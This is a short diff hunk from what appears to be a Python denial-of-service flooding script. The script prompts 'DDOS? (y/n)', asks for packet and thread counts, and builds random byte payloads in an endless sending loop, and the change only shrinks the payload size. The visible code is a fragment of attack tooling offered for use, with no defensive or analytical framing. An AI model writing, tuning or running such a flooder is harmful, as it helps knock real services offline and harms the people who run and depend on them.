@@ -58,7 +58,7 @@ choice = str(input(" DDOS? (y/n):"))
 times = int(input(" \033[0;31mPacket:"))
 threads = int(input(" \033[0;32mThreads:"))
 def run():
-	data = random._urandom(577)
+	data = random._urandom(376)
 	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
